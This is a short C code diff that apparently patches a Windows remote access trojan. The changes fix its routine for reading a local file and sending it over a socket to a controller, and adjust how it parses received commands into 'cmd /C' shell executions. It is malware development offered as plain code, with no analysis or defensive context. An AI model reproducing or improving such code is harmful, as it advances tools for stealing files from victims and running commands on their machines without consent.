@@ -55,7 +55,7 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 	errno_t errorNo = fopen_s(&fs, filePath, "rb");
 	if ( errorNo == 0 )
 	{
-		while( !feof(fs) )
+		for(;;)
 		{
 			char readBuffer[SOCKET_BUFFER_SIZE] = {};
 			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
@@ -69,13 +69,12 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
 			}
-			else
+			if ( readSize < SOCKET_BUFFER_SIZE || feof(fs) )
 			{
-				SocketSend(ratSocket, "0", 8);
+				SocketSend(ratSocket, "0", 1);
+				break;
 			}
 		}
-		SocketSend(ratSocket, "DONE", 4);
-		OutputDebugString("DONE");
 		fclose(fs);
 		return 0;
 	}
@@ -308,7 +307,7 @@ WinMain(HINSTANCE hInstance,
 
 			char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };
 
-			int commandIndex = 2;
+			int commandIndex = 1;
 			while ( splittedCommand[commandIndex] != NULL )
 			{
 				strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
